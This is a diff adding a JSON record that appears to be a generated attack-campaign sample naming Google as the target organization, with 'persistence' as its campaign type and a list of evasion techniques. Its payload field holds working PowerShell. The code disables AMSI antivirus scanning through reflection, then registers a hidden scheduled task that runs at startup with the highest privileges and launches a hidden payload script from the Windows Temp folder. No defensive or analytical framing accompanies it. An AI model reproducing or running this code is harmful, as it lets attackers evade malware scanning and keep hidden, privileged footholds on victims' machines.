@@ -1,0 +1,12 @@
+{
+  "organization": "Google",
+  "campaign_type": "persistence",
+  "evasion_techniques": [
+    "process_hollowing",
+    "amsi_bypass",
+    "environmental_keying"
+  ],
+  "payload": "# Z9QhVZojZGP6bsbzk5lr\n# Generated: 2025-11-03T12:20:52.709167\n# System: tXAGIMmViNIHzAq\n# Process: Hq0MH6Uusnvr\n\n\n# AMSI Bypass via Reflection\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n\n\n# Persistence via scheduled task\n$taskName = \"SystemUpdateTask\"\n$action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-WindowStyle Hidden -File C:\\Windows\\Temp\\payload.ps1\"\n$trigger = New-ScheduledTaskTrigger -AtStartup\n$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries\n\nRegister-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force\n",
+  "generated_at": "2025-11-03T12:20:52.709178",
+  "signature": "0a63af159d226c9cf14c1f4ca9235dbd1098edf727420c8f54f21ea291a4c1ba"
+}
